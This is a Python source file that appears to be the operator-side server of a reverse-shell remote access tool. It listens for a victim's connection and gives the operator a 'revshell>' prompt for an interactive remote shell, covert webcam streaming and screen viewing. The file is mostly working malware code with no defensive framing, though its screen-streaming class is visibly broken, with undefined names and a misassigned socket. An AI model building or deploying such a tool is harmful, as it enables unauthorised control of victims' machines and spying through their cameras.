import socket
import sys
import os
import signal
import cv2
import pickle
import struct
import imutils
import socket
import zlib
import pygame

# Intended to read any buffer size soon
BUFFER_SIZE = 1024 * 128

# Still not very stable, need a way to stop
# that thing and handle exceptions in case client
# SIGINTs

class WebcamStream:
	def __init__(self, client_socket):
		self.client_socket = client_socket

	def receive(self):
		data = b""
		payload_size = struct.calcsize("Q")
		while True:
			while len(data) < payload_size:
				packet = self.client_socket.recv(4 * 1024)
				if not packet:
					break
				data += packet
			packed_msg_size = data[:payload_size]
			data = data[payload_size:]
			msg_size = struct.unpack("Q", packed_msg_size)[0]
			while len(data) < msg_size:
				data += self.client_socket.recv(4 * 1024)
			frame_data = data[:msg_size]
			data = data[msg_size:]
			frame = pickle.loads(frame_data)
			cv2.imshow('Sender', frame)
			key = cv2.waitKey(10)
			if key == 13:
				return


# Shell is working client side but only
# with netcat listener.
class Shell:
	def __init__(self, client_socket):
		self.client_socket = client_socket

	def start(self):
		while(True):
			out = self.client_socket.recv(BUFFER_SIZE).decode().strip()
			sys.stdout.write(out)
			try:
				cmd = input("")
			except EOFError:
				print("")
				return
			cmd += '\n'
			# if not cmd:
			# 	continue
			if cmd == 'exit':
				return
			self.client_socket.send(cmd.encode())
			sys.stdout.write("\033[A" + cmd.split("\n")[-1])
			# pass

class ScreenStream:

	def __init__(self, client_socket):
		self.client_socket = socket

	def recvall(self, conn, length):
		buf = b''
		while len(buf) < length:
			data = self.client_socket.recv(length - len(buf))
			if not data:
				return data
			buf += data
		return buf

	def stream():
		pygame.init()
		screen = pygame.display.set_mode((WIDTH, HEIGHT))
		clock = pygame.time.Clock()
		watching = True    


		try:
			while watching:
				for event in pygame.event.get():
					if event.type == pygame.QUIT:
						watching = False
						break

				# Retreive the size of the pixels length, the pixels length and pixels
				size_len = int.from_bytes(conn.recv(1), byteorder='big')
				size = int.from_bytes(conn.recv(size_len), byteorder='big')
				pixels = decompress(recvall(conn, size))

	            # Create the Surface from raw pixels
				img = pygame.image.fromstring(pixels, (WIDTH, HEIGHT), 'RGB')

	            # Display the picture
				screen.blit(img, (0, 0))
				pygame.display.flip()
				clock.tick(60)
		finally:
			print("PIXELS: ", pixels)
			sock.close()

	

def main_loop(client_socket):
	while True:
		try:
			cmd = input("revshell> ")
		except EOFError:
			print("")
			return
		if not cmd:
			return
		cmd = cmd.strip()
		if not cmd:
			continue
		if cmd == "shell":
			client_socket.send(cmd.encode())
			shell = Shell(client_socket)
			shell.start()
		elif cmd.split()[0] == "webcam":
			client_socket.send(cmd.encode())
			webcam = WebcamStream(client_socket)
			webcam.receive()
		elif cmd == "exit":
			return

def sigIntHandler(signum, frame):
	print("\nrevshell> ", end="")

def main(PORT):
	HOST = '0.0.0.0'

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	s.bind((HOST, PORT))
	s.listen()
	print(f"Listening on {HOST}:{PORT} ...")
	client_socket, client_ip = s.accept()
	print(f"[+] Connection from {client_ip[0]}:{client_ip[1]}")
	signal.signal(signal.SIGINT, sigIntHandler)
	main_loop(client_socket)

	s.close()
	

if __name__ == '__main__':
	if len(sys.argv) != 2:
		print("Usage: python3 revshell-server.py <port>")
		exit(1)
	main(int(sys.argv[1]))